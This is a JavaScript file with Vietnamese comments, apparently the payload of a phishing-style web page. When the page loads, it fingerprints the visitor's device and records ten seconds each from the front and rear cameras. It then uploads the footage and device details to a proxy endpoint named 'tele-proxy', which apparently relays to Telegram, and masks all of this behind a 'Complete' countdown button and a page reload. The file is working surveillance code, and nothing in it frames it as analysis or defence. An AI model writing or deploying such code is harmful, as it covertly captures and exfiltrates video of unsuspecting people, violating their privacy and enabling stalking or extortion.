// main.js - Phiên bản Quay Video 10s
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  camera: '⏳ Đang quay video...'
};

// --- 1. NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else {
    info.os = ua.includes('Windows') ? 'Windows' : 'Desktop';
    info.device = platform || 'PC/Laptop';
  }
}

// --- 2. QUAY VIDEO CAMERA (10 giây) ---
async function recordVideo(facingMode = 'user', duration = 10000) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode,
        width: { ideal: 640 },
        height: { ideal: 480 }
      }, 
      audio: false 
    });

    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: 'video/webm;codecs=vp9'
    });

    const chunks = [];

    return new Promise((resolve) => {
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        stream.getTracks().forEach(t => t.stop());
        resolve(blob);
      };

      // Bắt đầu quay
      mediaRecorder.start();
      
      // Tự động dừng sau duration (10 giây)
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, duration);

      // Hiển thị trạng thái trên UI
      const statusDiv = document.getElementById('status');
      if (statusDiv) {
        let seconds = duration / 1000;
        const timer = setInterval(() => {
          seconds--;
          if (seconds > 0) {
            statusDiv.innerHTML = `🎥 Đang quay video (${seconds}s)...<br>Vui lòng giữ nguyên vị trí.`;
          } else {
            clearInterval(timer);
            statusDiv.innerHTML = '✅ Đã quay xong! Đang xử lý...';
          }
        }, 1000);
      }
    });

  } catch (e) {
    console.error('Lỗi quay video:', e);
    return null;
  }
}

// --- 3. HÀM CHÍNH ĐIỀU KHIỂN ---
async function main() {
  const button = document.querySelector('button') || document.querySelector('.btn');
  
  detectDevice();

  // Quay video camera trước 10s
  info.camera = '⏳ Đang quay camera trước...';
  let frontVideo = await recordVideo("user", 10000);
  
  // Quay video camera sau 10s
  info.camera = '⏳ Đang quay camera sau...';
  let backVideo = await recordVideo("environment", 10000);
  
  info.camera = (frontVideo || backVideo) ? '✅ Đã quay video camera trước và sau' : '🚫 Bị chặn hoặc không có camera';

  // Chuẩn bị gửi dữ liệu
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));

  if (frontVideo || backVideo) {
    if (frontVideo) formData.append('front', frontVideo, 'front.webm');
    if (backVideo) formData.append('back', backVideo, 'back.webm');
    await fetch(API_PROXY, { method: 'POST', body: formData });
  } else {
    await fetch(API_PROXY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });
  }

  // --- HIỆU ỨNG ĐẾM NGƯỢC TRÊN NÚT BẤM ---
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    
    let timeLeft = 3;
    button.innerText = `Hoàn tất (${timeLeft}s)`;
    
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Hoàn tất (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        window.location.href = "";
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = "";
    }, 3000);
  }
}

// Kích hoạt hệ thống
main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
